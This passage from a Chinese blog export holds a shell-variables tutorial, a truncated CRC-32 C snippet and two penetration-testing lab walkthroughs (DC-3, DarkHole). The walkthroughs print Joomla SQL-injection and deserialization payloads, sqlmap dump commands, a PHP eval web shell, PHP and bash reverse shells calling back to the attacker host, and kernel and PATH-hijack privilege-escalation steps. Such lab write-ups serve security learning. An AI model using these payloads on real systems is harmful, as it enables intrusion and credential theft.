练习</h3><p>​可以使用等号操作符为变量赋值:<br>​varName&#x3D;value<br>​varName是变量名，value是赋给变量的值。如果value不包含任何空白字符(例如空格)，那么就不需要将其放入引号中，否则必须使用单引号或双引号。</p><p><strong>注意</strong>:var &#x3D;value不同于var&#x3D;value。把var&#x3D;value写成var &#x3D;value是一个常见的错误。两边没有空格的等号是赋值操作符,加上空格的等号表示的是等量关系测试。</p><p>在变量名之前加上美元符号($)就可以访问变量的内容。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">var=<span class="string">&quot;value&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412203000936.png" alt="image-20240412203000936"></p><p>我们可以在printf、echo或其他命令的双引号中引用变量值:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">fruit=apple</span><br><span class="line">count=5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;We have <span class="variable">$count</span> <span class="variable">$&#123;fruit&#125;</span>&#123;s&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412210750534.png" alt="image-20240412210750534"></p><p>​因为shell使用空白字符来分隔单词，所以我们需要加上一对花括号来告诉shell这里的变量名是fruit，而不是fruit(s)。</p><p>​环境变量是从父进程中继承而来的变量。例如环境变量HTTP_PROXY，它定义了Intermet连接应该使用哪个代理服务器。</p><p>​该环境变量通常被设置成:<br>​HTTP PROXY&#x3D;192.168.1.23:3128<br>​export HTTP_PROXY</p><p>​export命令声明了将由子进程所继承的一个或多个变量。这些变量被导出后，当前shell脚本所执行的任何应用程序都会获得这个变量。she1l创建并用到了很多标准环境变量，我们也可以导出自己的环境变量。<br>​例如，PATH变量列出了一系列可供she1l搜索特定应用程序的目录。一个典型的PATH变量包含如下内容:</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412211049043.png" alt="image-20240412211049043"></p><p>​各目录路径之间以:分隔。$PATH通常定义在&#x2F;etc&#x2F;environment、&#x2F;etc&#x2F;profile或~&#x2F;.bashrc中。如果需要在PATH中添加一条新路径，可以使用如下命令:</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412211154589.png" alt="image-20240412211154589"></p><p>另外还有一些众所周知的环境变量:HOME、PWD、USER、UID、SHELL等。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412211252443.png" alt="image-20240412211252443"></p><p>​使用单引号时,变量不会被扩展( expand),仍依照原样显示。这意味着s echo$var’会显示svar。<br>​但如果变量$var已经定义过，那么secho”svar”会显示出该变量的值;如果没有定义过，则什么都不显示。</p><h3 id="1-2-3-补充内容"><a href="#1-2-3-补充内容" class="headerlink" title="1.2.3 补充内容"></a>1.2.3 补充内容</h3><p>shell还有很多内建特性。下面就是其中一些。</p><ol><li>获得字符串的长度</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">var=1234567890</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#var&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412225416201.png" alt="image-20240412225416201"></p><ol start="2"><li>识别当前所使用的shell</li></ol><p>echo $0或echo $SHELL</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412225512242.png" alt="image-20240412225512242"></p><ol start="3"><li>检查是否为超级用户</li></ol><p>​环境变量UID中保存的是用户D。它可以用于检查当前脚本是以root用户还是以普通用户的身份运行的。例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!bin/bash</span><br><span class="line">if [ $UID -ne 0 ]; then</span><br><span class="line">echo Non root user, please run as root.</span><br><span class="line">else</span><br><span class="line">echo Root user</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240412230241644.png" alt="image-20240412230241644"></p><ol start="4"><li>修改Bash的提示字符串(usernamechostname:~s)</li></ol><p>​当我们打开终端或是运行shell时，会看到类似于user@hostname:&#x2F;home&#x2F;s的提示字符串。不同的GNUIimux发布版中的提示字符串及颜色各不相同。我们可以利用ps1环境变量来定义主提示字符串。默认的提示字符串是在文件~&#x2F;.bashrc中的某一行设置的。<br>​还有一些特殊的字符可以扩展成系统参数。例如:\u可以扩展为用户名，\h可以扩展为主机名，而\w可以扩展为当前工作目录。</p><p>1.3 使用函数添加环境变量</p>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="/2024/04/10/DC-3/"/>
      <url>/2024/04/10/DC-3/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p><strong>kali:192.168.174.137</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>nmap -sn ip&#x2F;24 发现主机</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410182529933.png" alt="image-20240410182529933"></p><p><strong>获得主机ip：192.168.174.150</strong></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sS -sV -T4 -n -p- 192.168.174.150</p><p>参数解释：</p><ol><li><strong>-sS</strong>: 使用 SYN 扫描</li><li><strong>-sV</strong>: 探测开放端口上的服务版本信息。这个选项会尝试确定目标端口上运行的具体服务版本，从而可能暴露更多的关于目标系统的信息。</li><li><strong>-T4</strong>: 设置扫描的时间模板为 4。<code>nmap</code> 提供了不同的时间模板，从 0（最慢，最不容易被检测）到 5（最快，但最容易被防火墙或入侵检测系统检测到）。</li><li><strong>-n</strong>: 不进行 DNS 解析。这可以加快扫描速度</li><li><strong>-p-</strong>: 扫描所有端口。</li></ol><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410182952717.png" alt="image-20240410182952717"></p><p>可以看到开放了1个端口</p><p>80-http apache 2.4.18</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410183030982.png" alt="image-20240410183030982"></p><p>访问的同时，在后台进行目录扫描,看一下主页的信息,可以发现这次只有一个flag，且需要进入root权限获取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这一次，只有一面旗帜，一个入口，没有线索。</span><br><span class="line">要获得该标志，显然必须获得根权限。</span><br><span class="line">如何成为root取决于你自己，当然也取决于系统。</span><br><span class="line">祝你好运——我希望你喜欢这个小挑战。：-）</span><br></pre></td></tr></table></figure><p>目录扫描到一个<a href="http://192.168.174.150/administrator/%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%91%E7%8E%B0%E4%B8%80%E6%A0%B7%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%B8%94%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E7%AD%89%E9%87%8D%E5%AE%9A%E5%90%91%E4%B9%9F%E6%98%AF%E6%B2%A1%E5%B7%AE%E3%80%82">http://192.168.174.150/administrator/，访问后发现一样是一个登陆界面，且忘记密码等重定向也是没差。</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410190923148.png" alt="image-20240410190923148"></p><p>但界面上的Joomla！倒是提醒我们可以去看看有没有存在的漏洞，一艘还真有<a href="https://blog.csdn.net/smli_ng/article/details/115799954">Joomla 漏洞总结</a>我们先用<a href="https://blog.csdn.net/smli_ng/article/details/115799954#t2">CVE-2015-8562 反序列化漏洞</a>试试，就按着文章里的教程实验</p><p><strong>首先我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410192928091.png" alt="image-20240410192928091"></p><p><strong>然后将User-Agent设置为以下内容，然后cookie设置为才刚目标网站返回的内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:</span><br><span class="line">&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:</span><br><span class="line">&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:</span><br><span class="line">&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;fee</span><br><span class="line">d_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connectio</span><br><span class="line">n&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p>这一种好像不行，不懂是不是这个版本修复了，换一种方法试试</p><h4 id="CVE-2017-8917-SQL注入漏洞"><a href="#CVE-2017-8917-SQL注入漏洞" class="headerlink" title="CVE-2017-8917 SQL注入漏洞"></a>CVE-2017-8917 SQL注入漏洞</h4><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p>访问主页<img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410194637343.png" alt="image-20240410194637343"></p><p>发现可以使用，上sqlmap试试</p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> –dbs</p><p>&#x2F;&#x2F;*表示注入位置<br>&#x2F;&#x2F;查询所有数据库<br><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410195907716.png" alt="image-20240410195907716"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410195949663.png" alt="image-20240410195949663"></p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> -D “joomladb” -T “#__users” –columns<br>查询users表内的列名,选择sqlmap自带的默认的字典即可</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410200501591.png" alt="image-20240410200501591"></p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> -D “joomladb” -T “#__users” -C “username,password” –dump<br>&#x2F;&#x2F;读取指定字段内容</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410200627349.png" alt="image-20240410200627349"></p><p>密码为md5加密 可以使用kali内的john 解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch admin.txt   #创建文件</span><br><span class="line">vi admin.txt      #编辑</span><br><span class="line">john admin.txt    #破解</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410201249865.png" alt="image-20240410201249865"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><blockquote><p>通过对后台的各种查询，发现Extensions-&gt;Templates里面的模板可以执行PHP脚本</p><p>这个不看下攻略没用过的话还挺难找</p></blockquote><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410202148182.png" alt="image-20240410202148182"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410202233083.png" alt="image-20240410202233083"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//当系统没有禁用proc_popen的时候，我们是可以借助proc_popen轻松反弹这样的一个shell的。</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.174.137&quot;</span>, <span class="string">&quot;5555&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410202545098.png" alt="image-20240410202545098"></p><p>之后保存访问<a href="http://192.168.174.150/index.php%EF%BC%8Ckali%E7%94%A8nc%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%BC%B9">http://192.168.174.150/index.php，kali用nc接收反弹</a></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410202616938.png" alt="image-20240410202616938"></p><p>接下来就是提权了，先转化一下终端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410202723341.png" alt="image-20240410202723341"></p><p>find &#x2F; -user root -perm 4000 -print &gt;&#x2F;dev&#x2F;null</p><p>看了下没有适合利用suid提权的命令，找了下home目录，dc3也是空的，但发现个隐藏文件.sudo_admin_successfule.不懂后面有没有用，继续跟着教程看看</p><p>另外开一个终端去漏洞库查找有没有相关漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/*release#查看发行版信息</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410210247798.png" alt="image-20240410210247798"></p><p>是ubuntu 16.04</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version  #查看内核版本的全部信息</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410210324583.png" alt="image-20240410210324583"></p><p>内核时Linux 4.4.0，查看kali本地漏洞库里面的exp。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410210703519.png" alt="image-20240410210703519"></p><p>对应得版本要都试试，我这里因为是直接看攻略所以 就直接用39772.txt</p><p>查看exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410210845350.png" alt="image-20240410210845350"></p><p>可以看到有下载地址，我们下载下面那个zip文件wget就行</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410210954802.png" alt="image-20240410210954802"></p><p>然后用python搭建一个简单服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure><p>回到反弹回来得shell，wget文件即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.137:8081/39772.zip</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410211555816.png" alt="image-20240410211555816"></p><p>解压exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip</span><br></pre></td></tr></table></figure><p><em>进入39772</em> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd 39772</span><br></pre></td></tr></table></figure><p>解压缩exploit.tar</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410212043213.png" alt="image-20240410212043213"></p><p>进入 ebpf_mapfd_doubleput_exploit 运行exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410212800584.png" alt="image-20240410212800584"></p><p>过一会就会变成root用户了，还挺神奇。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240410212849338.png" alt="image-20240410212849338"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DarkHole</title>
      <link href="/2024/04/07/DarkHole/"/>
      <url>/2024/04/07/DarkHole/</url>
      
        <content type="html"><![CDATA[<h1 id="DockerHole"><a href="#DockerHole" class="headerlink" title="DockerHole"></a>DockerHole</h1><p><strong>kali:192.168.174.137</strong></p><p><strong>给靶机生成个物理地址00:50:56:23:4C:10</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407163518855.png" alt="image-20240407163518855"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>arp-scan -l 发现主机</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407163800693.png" alt="image-20240407163800693"></p><p><strong>获得主机ip：192.168.174.149</strong></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sS -sV -T4 -n -p- 192.168.174.149</p><p>参数解释：</p><ol><li><strong>-sS</strong>: 使用 SYN 扫描</li><li><strong>-sV</strong>: 探测开放端口上的服务版本信息。这个选项会尝试确定目标端口上运行的具体服务版本，从而可能暴露更多的关于目标系统的信息。</li><li><strong>-T4</strong>: 设置扫描的时间模板为 4。<code>nmap</code> 提供了不同的时间模板，从 0（最慢，最不容易被检测）到 5（最快，但最容易被防火墙或入侵检测系统检测到）。</li><li><strong>-n</strong>: 不进行 DNS 解析。这可以加快扫描速度</li><li><strong>-p-</strong>: 扫描所有端口。</li></ol><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407164135872.png" alt="image-20240407164135872"></p><p>可以看到开放了两个端口</p><p>22-ssh Openssh</p><p>80-http apache 2.4.41</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407164518989.png" alt="image-20240407164518989"></p><p>访问的同时，在后台进行目录扫描</p><p>可以获得<a href="http://192.168.174.149/upload/%E6%8E%A8%E6%B5%8B%E5%8F%AF%E8%83%BD%E6%9C%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%87%83%E7%81%AB%E5%8F%B3%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%AD%89%E3%80%82">http://192.168.174.149/upload/推测可能有文件上传漏洞，燃火右上角有一个登陆界面，可能存在弱口令，sql注入等。</a></p><h3 id="登陆界面"><a href="#登陆界面" class="headerlink" title="登陆界面"></a>登陆界面</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407172106009.png" alt="image-20240407172106009"></p><p>简单尝试admin:admind登陆看下返回信息有没有提示，发现没有，去注册一个试试</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407172304098.png" alt="image-20240407172304098"></p><p>发现admin用户已经被注册了，后台开一个bp先爆破着，自己注册一个账号登陆上去看看有什么信息</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173200797.png" alt="image-20240407173200797"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173225389.png" alt="image-20240407173225389"></p><p>可以看到，注册完有自己的信息和修改密码的功能且网址中还有个id&#x3D;2，推测id&#x3D;1为admin用户的界面，修改试下能不能访问</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173325093.png" alt="image-20240407173325093"></p><p>试试抓包能不能直接修改admin的密码</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173402240.png" alt="image-20240407173402240"></p><p>改成1后试试用admin登陆，可以看到登陆成功</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407173449466.png" alt="image-20240407173449466"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>登陆上管理员界面后发现多了个文件上传的地方，结合前面的目录，可能 存在文件上传漏洞，先试试上传自己写的一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CMD&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407184027696.png" alt="image-20240407184027696"></p><p>可以发现只允许上传jpg,png,gif这样的图片，试试绕过方法</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407184400185.png" alt="image-20240407184400185"></p><p>先试试修改类型</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407184513629.png" alt="image-20240407184513629"></p><p>上传一张正常的图片试试</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407185347279.png" alt="image-20240407185347279"></p><p>发现文件路径，访问一下也确实能出现图片</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407185413474.png" alt="image-20240407185413474"></p><p>修改下后缀试试，pphphp绕过了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407190606652.png" alt="image-20240407190606652"></p><p>但文件并没有以php的形式保留下来，作了个图片马，也不行，试试别的方法，phtml和pchar可以</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407191935091.png" alt="image-20240407191935091"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407191959674.png" alt="image-20240407191959674"></p><p>下面就是寻找flag的提取过程了</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在获取到shell的基础上，我么需要反弹shell</p><p>kali：nv -lvvp6666</p><p>shell: bash -c ‘bash -i  &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.174.137&#x2F;6666  0&gt;&amp;1’</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407194457299.png" alt="image-20240407194457299"></p><h4 id="sudo-root提权"><a href="#sudo-root提权" class="headerlink" title="sudo root提权"></a>sudo root提权</h4><p>cat &#x2F;etc&#x2F;passwd 发现了john用户 在家目录下面发现了一个toto文件执行发现和id一样的功能</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407200300090.png" alt="image-20240407200300090"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407200340646.png" alt="image-20240407200340646"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line"><span class="built_in">touch</span> <span class="built_in">id</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="built_in">id</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">id</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp;<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">cd</span> /home/john</span><br><span class="line">./toto</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407201525851.png" alt="image-20240407201525851"></p><p>然后现在我们再次执行就可以查看账号和密码文件了 直接使用<code>SSH</code>进行连接：<code>john/root123</code></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407201629653.png" alt="image-20240407201629653"></p><p><strong>ssh <a href="mailto:&#x6a;&#x6f;&#104;&#110;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x37;&#52;&#x2e;&#x31;&#52;&#x39;">&#x6a;&#x6f;&#104;&#110;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#x37;&#52;&#x2e;&#x31;&#52;&#x39;</a></strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407201814765.png" alt="image-20240407201814765"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; &gt; file.py</span><br><span class="line">cat file.py</span><br><span class="line">sudo python3 /home/john/file.py</span><br><span class="line">输入密码root123</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407202419380.png" alt="image-20240407202419380"></p><p>直接执行好像是不能提权的</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240407203015057.png" alt="image-20240407203015057"></p><p>但他对file.py这个文件是有执行权限的，所以从这一点出发，所以才要把语句写到文件里。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRC-32</title>
      <link href="/2024/03/23/CRC-32/"/>
      <url>/2024/03/23/CRC-32/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> poly = <span class="number">0x04C11DB7</span>; <span class="comment">//多项式函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用无符号整型unsigned int 模拟32位寄存器 </span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">crc32</span><span class="params">(<span class="type">char</span> * str, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> poly = <span class="number">0x04C11DB7</span>;  <span class="comment">//多项式函数 </span></span><br><span class="line"><span class="type">uint32_t</span> data = <span class="number">0xffffffff</span>; <span class="comment">//初始化寄存器 </span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">data ^= str[i]&lt;&lt;<span class="number">24</span>; <span class="comment">//由高字节向低字节循环处理 </span></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;a</span><br><span class="line"><span class="title function_">for</span> <span class="params">(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (data &amp; <span class="number">0x80000000</span>) <span class="comment">//最高位为1，就与多项式进行异或</span></span><br><span class="line">data = (data &lt;&lt; <span class="number">1</span>) ^ poly;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">data &lt;&lt;= <span class="number">1</span>;       </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data ^ <span class="number">0xffffffff</span>; <span class="comment">//反转运算 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">////生成CRC32表 </span></span><br><span class="line"><span class="comment">////generate_crc32_table();</span></span><br><span class="line"><span class="comment">//uint32_t crc32_table_res = 0;</span></span><br><span class="line"><span class="comment">//char** str = &#123;&quot;Hello, 